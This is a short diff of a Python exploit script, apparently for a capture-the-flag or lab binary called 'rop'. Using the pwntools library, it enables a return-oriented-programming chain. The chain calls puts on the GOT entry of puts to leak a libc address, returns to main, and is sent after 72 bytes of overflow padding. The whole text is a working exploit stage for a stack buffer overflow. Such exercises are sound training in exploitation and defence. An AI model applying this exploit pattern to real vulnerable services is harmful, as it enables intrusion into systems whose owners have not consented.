@@ -5,9 +5,11 @@ from pprint import pprint
 
 elf = ELF("./rop")
 target = elf.process()
-#rop = ROP(elf)
-#rop.call("puts", [elf.got['puts']])
-#rop.call("main")
+
+rop = ROP(elf)
+rop.call("puts", [elf.got['puts']])
+rop.call("main")
+
 #print(elf)
 #pprint(elf.symbols)
 
@@ -16,7 +18,7 @@ target.recvline() # whats ur name
 
 payload = [
         b"A"*72,
-        p64(elf.symbols['main'])
+        rop.chain()
         ]
 payload = b"".join(payload)
 target.sendline(payload)
